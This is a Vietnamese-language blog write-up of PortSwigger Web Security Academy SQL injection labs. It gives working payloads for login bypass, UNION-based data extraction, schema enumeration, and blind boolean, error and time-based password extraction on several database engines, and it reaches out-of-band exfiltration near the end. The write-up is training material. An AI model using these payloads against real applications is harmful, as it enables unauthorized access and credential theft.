---
title: 'SQL injection vulnerability'
slug: sqlinjection
type: writeup
date: 2021-09-27
summary: 'PortSwigger Web Security Academy Labs...'
tags: [security, writeup]
---

## SQL Injection
### [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data]
Đề bài yêu cầu chúng ta khai thác lỗ thông trong phần filter danh mục sản phẩm, và đã cho sẳn chúng ta câu truy vấn sql như sau:
```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
Khi truy cập vào bài lab, thì chúng ta thấy 1 trang web bán hàng gồm nhiều sản phẩm, theo như đề bài chúng ta filter bằng những từ khóa có sẳn dùng Burp Suite để bắt lấy request như sau:
Chuyển sang repeater để thử nhiều trường hợp. Để khai thác lỗ hổng này chúng ta dựa vào câu truy vấn đề đã cho sẳn, mình sẽ được khi vào phần category. Khai thác lỗ hổng này thì mình chèn vài dong truy vấn như sau:
```
SELECT * FROM products WHERE category = 'Gifts' OR 1=1 -- AND released = 1
```
Câu truy vấn trên có nghĩa là phần check released = 1 đã bị bỏ đi vì ‘–’ là cmt trong ngôn ngữ sql, server sẽ hiểu phần sau là 1 câu cmt và điều kiện 1=1 luôn luôn đúng nên tất cả các dữ liệu sẽ bị leak ra .
### [SQL injection vulnerability allowing login bypass]
Mô tả bài lab cho chúng ta thấy đây chúng ta sẽ khai thác 1 lỗ hổng đăng nhập có username = administrator. Và bây giờ chúng ta truy cập bài lab.
Đề bài cho chúng ta 1 trang web bán hàng, để ý thấy phần account theo như mô tả, chúng ta vào và login.
Sau khi dùng burp suite bắt lại request login chúng ta thấy như sau:
Từ đó có thể đoán được cây truy vấn có thể có dạng :
```
SELECT * FROM products WHERE username = 'administrator' AND password = 'hello'
```
Vậy vì username đã biết nên chúng ta chỉ việc bypass qua phần password là sẽ solve được lab này. Việc dùng ‘–’ để bypass sẽ giúp chúng ta biến phần check pass trở thành 1 câu cmt và chúng ta đã qua được.
### SQL injection UNION attack, determining the number of columns returned by the query
Bài lab mô tả rằng chúng ta sẽ khai thác lỗ hổng trong phần danh mục sản phẩm bằng câu lệnh *UNION*.
TRuy cập bài lab chúng ta thấy lại page bán hàng lúc nãy và lọc thử category dùng BurpSuite bắt lại request để phân tích.
Theo như request thì câu query vẫn sẽ là :
```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
Để áp dụng *UNION* và thì có cách như sau :
```
Phương pháp thứ hai liên quan đến việc gửi một loạt các tải trọng chỉ định một số giá trị null khác nhau: UNION SELECT
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```
Phương pháp này sẽ bypass được nếu số lần NULL = số cột, để phép UNION 2 câu lệnh select thành công thì số cột trả về của UNION phải giống câu lệnh trước nó.
Để check được số cột chúng ta dùng repeater để check.
Và kết quả thu được là có 3 cột và chúng ta đã exploit thành công.
### Lab: SQL injection UNION attack, finding a column containing text
Tên bài lab là tìm 1 cột chứa văn bản , :vv khả năng bruteforce khá cảo. Theo mô tả bài lab chúng ta vẫn sẽ khai thác ở phần category của trang web bán hàng. Dựa trên thông tin kỹ thuật của việc tìm văn bản thì chúng ta phải xác định số cột trước và sau đó mới có thể kiểm tra và xác định văn bản.
Sau khi thử 3 lần thì chúng ta xác định được có 3 cột và tương tự chúng ta sẽ tìm text theo phương thức sau :
```
Sau khi đã xác định số lượng cột cần thiết, bạn có thể thăm dò từng cột để kiểm tra xem nó có thể giữ 
dữ liệu chuỗi hay không bằng cách gửi một loạt các tải trọng đặt giá trị chuỗi vào mỗi cột lần lượt. 
Ví dụ: nếu truy vấn trả về 3 cột, bạn sẽ gửi: UNION SELECT
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```
Sau khi check 3 lần thì chúng ta xác định được cột thứ 2 là text và cũng đã bypass thành công. Và chúng ta đã có được chuỗi text mà trang web trả về như sau.
Sau đó thay thế string vào chữ a mà chúng ta đã thử để hoàn thành bài lab
### SQL injection UNION attack, retrieving data from other tables
Mô tả của bài lab này nói rằng chũng ta vẫn sẽ khai thác lỗ hổng ở phần category tuy nhiên chúng ta phải kết hợp các kỹ thuật ở bài trước như dùng UNION để check số column, check text, và UNION 1 câu lệnh khác kèm theo bypass phần đuôi, bla bla
Nghe nó như 1 bài tổng hợp vậy. Giờ chúng ta vào page bán hàng và bắt request để testing lỗ hổng nào.
Đầu tiên chúng ta sẽ dùng *UNION SELECT NULL–* để check xem có bao nhiêu column ở đây.
Sau khi check được 2 column chúng ta sẽ xác định xem 2 column này có phải text hay không vì chúng ta đang muốn leak ra username và password nên để thõa mãn thì cả 2 đều phải là text để trả về được chuỗi mà mình mong muốn.
Sau đó chúng ta sẽ dùng câu truy vấn sau để leak:
```
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT username, password FROM users -- AND released = 1
```
Câu truy vấn này áp dụng UNION và ‘–’ để xác định được payload, vì thường thì khi truy vấn username và password câu truy vấn sẽ là " *SELECT username, password FROM users*.
Và chúng ta điều chỉnh bằng burpsuite khi bắt request như sau:
Chúng ta đã có password và username. ==> Đăng nhập để solve bài lab.
### Lab: SQL injection UNION attack, retrieving multiple values in a single column
Bài lab này yêu cầu chúng ta làm tương tự như bài trước đó là tìm ra password và username để login vào page trên. Điều đó chúng ta cũng phải xác định số column và text của các cột như đã làm với bài trước.
Bắt request bằng Burp Suite để check column và text như các bài lab ở trên thì thấy rằng chỉ có 1 column text trong khi chúng ta cần trả về là cả username và password. Điều đó có nghĩa là chúng ta truy xuất nhiều giá trị bằng 1 column, và chúng ta đã có cách nối chuỗi khi truy vấn.
```
Lý tưởng nhất là bao gồm một dấu tách phù hợp để cho phép bạn phân biệt các giá trị kết hợp. Ví dụ: trên Oracle, bạn có thể gửi đầu vào:
' UNION SELECT username || '~' || password FROM users--
```
Điều đó có nghĩa là tùy thuộc mỗi môi trường sẽ có cách nối lại khác nhau, chúng ta có thể truy cập [Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
Test thử thì chúng ta đã có được user và password mong muốn.
### SQL injection attack, querying the database type and version on Oracle
Bài lab đã gợi ý dùng *UNION* để check version trên Oracle. Để làm được điều đó chúng ta phải áp dụng lại những kỹ thuật đã thực hiện qua những bài lab trước đó là check column và text.
Tương tự như những bài trước dùng câu lệnh như sau để check column:
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```
Check như thường lệ lại thấy không thể được:
Nên chúng ta đọc hint như sau, điều này nói lên rằng nền tảng Oracle có hỗ trợ cho chúng ta cách để làm bài này :D
```
On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does 
not query from a table, you will still need to include the FROM keyword followed by a valid table name.
There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' 
FROM dual
```
Có nghĩa là chúng ta phải thay đổi câu lệnh 1 chút như sau để phù hợp với nền tảng Oracle :
```
' UNION SELECT NULL FROM dual--
' UNION SELECT 'abc' FROM dual--
```
Tương tự check text cho cả 2 column :
Sau đó truy vấn version của Oracle theo cấu trúc trên [Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) sau :
```
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```
### Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
Bài lab này chỉ cần áp dụng kiến thức và kỹ thuật cơ bản như bài trước nhưng khác 1 điều là môi trường thay vì là Oracle đã chuyển đổi thành MySQL và Microsoft , điều đó có không có khăn gì mấy khi chúng ta đã có trợ thủ đắc lực từ [Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) để tham khảo và thay đổi cấu trúc của câu truy vấn cho phù hợp với môi trường.
Check column và text bằng câu truy vấn sau tương tự lần lượt cho MySQL và Microsoft:
```
' UNION SELECT NULL#
' UNION SELECT 'abc'#
```
Cuối cùng check version của MySQL như sau :
### Lab: SQL injection attack, listing the database contents on non-Oracle databases
Bài lab này khá đặc biệt. Để làm được bài này chúng ta phải biết được 1 vài kiến thức như sau :
```
Most database types (with the notable exception of Oracle) have a set of views called the information schema which provide 
information about the database.
You can query information_schema.tables to list the tables in the database:
SELECT * FROM information_schema.tables
This returns output like the following:
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE
You can then query information_schema.columns to list the columns in individual tables:
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
This returns output like the following:
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE
```
Có nghĩa là chúng ta sẽ tìm được chính xác tên bảng và các cột của nó. Cụ thể là chúng ta sẽ tìm user username và password.
Tương tư như hướng dẫn và các bài lab trước chúng ta khai thác lỗ hổng ở phần category dùng burp suite để bắt lại request và đưua sang repeater.
Sau khi check 2 column và đều có thể trả về text. ta sử dụng câu truy vấn để tìm ra bảng user cần thiết như sau:
```
'UNION SELECT table_name, NULL FROM information_schema.tables--
```
[https://github.com/datnlq/Source/blob/main/SQL%20Injection/image/SQL_oracledata_checkusers.jpg?raw=true](https://github.com/datnlq/Source/blob/main/SQL%20Injection/image/SQL_oracledata_checkusers.jpg?raw=true)
==>users_jhsnhk
Sau khi có được tên bảng thì chúng ta sẽ kiểm tra trong bảng đó có những cột nào bằng câu truy vấn sau:
```
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_jhsnhk'--
```
=>username_vlcnsm
=>password_jqalkc
Sau khi có đầy đủ thông tin để truy vấn thì chúng ta truy vấn như sau :
```
' UNION SELECT username_vlcnsm, password_jqalkc FROM users_jhsnhk--
```
=>administrator
=>806swch4qqaqh1hi2aof
### Lab: SQL injection attack, listing the database contents on Oracle
Để thực hiện bài lab này chúng ta xem qua 1 số câu truy vấn cơ bản trên Oracle:
```
On Oracle, you can obtain the same information with slightly different queries.
You can list tables by querying all_tables:
SELECT * FROM all_tables
And you can list columns by querying all_tab_columns:
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```
Sau đó chúng ta thực hiện và xác định tương tự các bước của bài lab trên.
Vì trên Oracle chúng ta sử dụng câu truy vấn khác đi:
```
' UNION SELECT table_name,NULL FROM all_tables--
```
Kết quả sẽ trả về toàn bộ bảng trong database và chúng ta tìm ra bảng user.
=>USERS_XECFYC
Sau đó sẽ tìm ra các cột của bảng này bằng câu truy vấn:
```
SELECT * FROM all_tab_columns WHERE table_name = 'USERS_XECFYC'
```
=>USERNAME_TODNFC
=>PASSWORD_BTMHJE
Tiếp theo chúng ta truy vấn bằng câu lệnh:
```
' UNION SELECT USERNAME_TODNFC, PASSWORD_BTMHJE FROM USERS_XECFYC--
```
=>administrator
=>yuzcbjhzmm3q8ubkscdn
### Lab: Blind SQL injection with conditional responses
Bài lab này cần nhiều kiến thức cơ bản cũng như là cách thức hơn các bài lab trước rất nhiều. Cụ thể là về các [Blind Vulnerable](https://portswigger.net/web-security/sql-injection/blind) . Sau đó chúng ta sẽ bắt tay vào giải quyết bài lab, kèm theo là gợi ý về lổ hổng để khai thác chính là tracking cookie và “Welcome Back” nếu chúng ta tracking đúng cookie.
Điểm mấu chốt là chúng ta phải kiếm được password của administrator từ bảng users.
Khi load page lên request chúng ta bắt được có biến là *TrackingId*, chúng ta check thử xem biến này có phải là 1 blind vulnerable hay không bằng payload sau:
```
' AND '1'= 1 --
' AND '1'= 2 --
```
Đúng như dự đoán đã trả về ‘Welcome Back’ Đây sẽ là lổ hổng mà chúng ta có thể khai thác để lấy ra mật khẩu.
```
' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--
```
Tiếp theo chúng ta có thể dựa vào câu truy vấn sau cùng chức năng của Intruder để tìm ra được length của password.
```
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'--
```
Sau đó thiết lập value và payload là number chạy từ 1-50 như dưới:
Chỉnh sửa option Match thành Wellcome Back, sau đó bruteforce.
Sau khi tấn công xong chúng ta xác định được length của pass = 20, tiếp tục sẽ là tìm ra mật khẩu, nhưng hạn chế của lỗ hổng này là chúng ta chỉ có thể tìm từng chữ cái và nếu đúng sẽ trả về *Welcome Back*….
Tuy nhiên từ [Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) đã cho chúng ta giải pháp sau đó là hàm SUBSTRING(), hàm này có thể lấy n chữ cái ở vị trí thứ n. Vì mình chỉ nên kiểm tra
```
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
```
Bới vì password có thể là ký tự hoặc chữ số nên chúng ta phải setup lại payload như sau :
Add từ a-z A-Z và 0-9 vào … xác định biến bruteforce như sau :
Chạy lần đầu tiên chúng ta được chữ cái đầu tiên của password là : t và kết quả của lần lượt những lần sau đó là
```
Sau đó tiếp tục tăng SUBSTRING(password,2,1) = 6 
Sau đó tiếp tục tăng SUBSTRING(password,3,1) = n
Sau đó tiếp tục tăng SUBSTRING(password,4,1) = n
Sau đó tiếp tục tăng SUBSTRING(password,5,1) = p
Sau đó tiếp tục tăng SUBSTRING(password,6,1) = y 
Sau đó tiếp tục tăng SUBSTRING(password,7,1) = 8
Sau đó tiếp tục tăng SUBSTRING(password,8,1) = e
Sau đó tiếp tục tăng SUBSTRING(password,9,1) = 3
Sau đó tiếp tục tăng SUBSTRING(password,10,1) = 7
Sau đó tiếp tục tăng SUBSTRING(password,11,1) = 5
Sau đó tiếp tục tăng SUBSTRING(password,12,1) = v
Sau đó tiếp tục tăng SUBSTRING(password,13,1) = 4
Sau đó tiếp tục tăng SUBSTRING(password,14,1) = w
Sau đó tiếp tục tăng SUBSTRING(password,15,1) = 1
Sau đó tiếp tục tăng SUBSTRING(password,16,1) = h 
Sau đó tiếp tục tăng SUBSTRING(password,17,1) = 0
Sau đó tiếp tục tăng SUBSTRING(password,18,1) = n
Sau đó tiếp tục tăng SUBSTRING(password,19,1) = w
Sau đó tiếp tục tăng SUBSTRING(password,20,1) = 0
```
=>t6nnpy8e375v4w1h0nw0
Chúng ta đã có password và username việc còn lại là solve bài lab.
### Lab: Blind SQL injection with conditional errors
Bài lab này đặc biệt hơn bài trên , về cơ bản kỹ thuật dùng là tương tự nhau nhưng bài dưới thì cách thức để khai thác lại bị chặn, nhưng lại k chặn những thao tác khác => Điều đó khiến cho chúng ta có thể dùng cách suy đoán để tìm ra. Dựa vào cơ sở lý thuyết dưới đây chúng ta vận dụng vào bài lab sau.
```
Trong trường hợp này, thường có thể khiến ứng dụng trả về các phản hồi có điều kiện bằng cách kích hoạt lỗi SQL có điều kiện, 
tùy thuộc vào điều kiện được đưa vào. Điều này liên quan đến việc sửa đổi truy vấn để nó sẽ gây ra lỗi cơ sở dữ liệu nếu điều 
kiện là đúng, nhưng không phải nếu điều kiện là sai. Thông thường, một lỗi không được xử lý do cơ sở dữ liệu ném ra sẽ gây ra 
một số khác biệt trong phản hồi của ứng dụng (chẳng hạn như thông báo lỗi), cho phép chúng tôi suy ra sự thật của điều kiện 
được đưa vào.
Để xem cách này hoạt động như thế nào, giả sử rằng hai yêu cầu được gửi lần lượt có chứa các giá trị cookie TrackingId sau:
xyz 'AND (SELECT CASE WHEN (1 = 2) THEN 1/0 ELSE' a 'END) =' a
xyz 'AND (SELECT CASE WHEN (1 = 1) THEN 1/0 ELSE' a 'END) =' a
``````
'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```
Vì truy vấn này không trả về lỗi, bạn có thể suy ra rằng bảng này tồn tại. Lưu ý rằng điều kiện WHERE ROWNUM = 1 ở đây rất quan trọng để ngăn truy vấn trả về nhiều hơn một hàng, điều này sẽ phá vỡ sự liên hệ của chúng ta
Như chúng ta thấy ta gửi 1 điều kiện đúng và được trả về lỗi. Đây là 1 phép thử trước tiên cho chúng ta thực thi những câu truy vấn phía sau :
```
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```
Chúng ta có thể kiểm tra độ dài của password qua sự trả về lỗi bằng câu truy vấn sau :
```
'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
Bằng cách sử dụng Intruder chúng ta có thể tìm ra length của pass tương tự như bài lab trên :
Dựa vào sự thay đổi của response chúng ta suy ra được lenght password = 20. Điều này có nghĩa là chúng ta phải bruteforce 20 lần để tìm ra password.
```
'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
=> Password = 5r8t1j8dgpzli83ve2mc
Và từ đó hoàn thành bài lab
### Exploiting blind SQL injection by triggering time delays
Đầu tiên xem qua 1 số cách thức cơ bản của dạng time delays
```
The techniques for triggering a time delay are highly specific to the type of database being used. On Microsoft SQL Server, input like the following can be used to test a condition and trigger a delay depending on whether the expression is true:
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
The first of these inputs will not trigger a delay, because the condition 1=2 is false. The second input will trigger a delay of 10 seconds, because the condition 1=1 is true.
Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time:
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```
Điều này có nghĩa là chúng ta sẽ dùng dạng câu lệnh time delays để kiểm tra xem điều kiện có đúng hay không. Tuy nhiên với mỗi môi trường khác nhau thì câu truy vấn time sẽ khác nhau như sau :
```
You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.
Oracle	dbms_pipe.receive_message(('a'),10)
Microsoft	WAITFOR DELAY '0:0:10'
PostgreSQL	SELECT pg_sleep(10)
MySQL	SELECT sleep(10)
```
Sau khi thử 4 câu của 4 phiên bản thì :
```
'||pg_sleep(10)--
```
Đây là payload chạy được
Và đã hoàn thành được bài lab, mục đích của bài lab này chỉ là muốn chúng ta hiểu và biết về time delay trong blind vuln mà thôi :D .
### Lab: Blind SQL injection with time delays and information retrieval
Bài lab này tương tự ngữ cảnh với những bài lab trên tuy nhiên lần này không chỉ kiểm tra lỗ hổng nữa mà yêu cầu là truy xuất thông tin và tìm ra password của administrator.
```
'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```
Theo lý thuyết, thì nếu như điều kiện mà chúng ta kèm vào câu truy vấn là đúng thì time delay sẽ được kích hoạt dựa vào đoạn lệnh delay mình thêm vào. Dựa vào đó chúng ta sẽ tìm ra những điều kiện đúng ví dụ như password của bài :D vì chúng ta đã có sẵn username = administrator.
Chúng ta check username bằng câu truy vấn dưới đây, nếu đúng có nghĩa chúng ta đã check được username in database của server, tương tự chúng ta có thể làm với password.
```
'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```
Tuy nhiên không thể leak được password ra mà chúng ta chỉ có thể check đúng hay sai nên chúng ta sẽ bruteforce giống những lần trước, tuy nhiên điều kiện là những request có time respond phải trên 10s.
```
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```
Thay vì bruteforce 1 biến thì giờ mình sẽ chuyển sang bruteforce 2 biến để cho nhanh hơn, điều chỉnh payload 1 từ 1-20, payload 2 là a-z,0-9. Sau đó tiến hành bruteforce vì số lượng hơi lớn nên phải chờ từ 5-10p.
=>Password = y2jezyuzwza8qobpru5h
### Lab: Blind SQL injection with out-of-band interaction
Chúng ta vẫn sẽ khai thác ở phần tracking cookie, tuy nhiên phải trigger out-of-band (OAST) .
Để trigger chúng ta có thể tham khảo [Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) sau để tìm ra cheat sheet phù hợp. Sau đó truy cập vào burpsuite để get DNS được hỗ trợ.
```
For example, you can combine SQL injection with basic XXE techniques as follows:
'+UNION+SELECT+EXTRACTVALUE(xmltype('+%25remote%3b]>'),'/l')+FROM+dual--
```
Sau khi send payload, chúng ta truy cập vào Burp và pull data về nếu pull về được có nghĩa là đã thành công.
### Lab: Blind SQL injection with out-of-band data exfiltration
Bài lab này là 1 dạng uplevel của bài trước, vì bài trước chỉ cần có dữ liệu trả về ngoài Client là được, nhưng lần này chúng ta phải tìm ra password của admin và login vào mới có thể hoàn thành bài lab.
```
For example, you can combine SQL injection with basic XXE techniques as follows:
'+UNION+SELECT+EXTRACTVALUE(xmltype('+%25remote%3b]>'),'/l')+FROM+dual--
```
Thay thế *ID.burpcollaborator.net* bằng ID mà Burp đã cung cấp cho chúng ta và chúng ta đã có payload.
Sau khi send payload chúng ta qua Client và pull data về, check thì chúng ta sẽ thấy trước phần .ID sẽ có 1 chuỗi được trả về đó chính là password của chúng ta.
Login và solve bài lab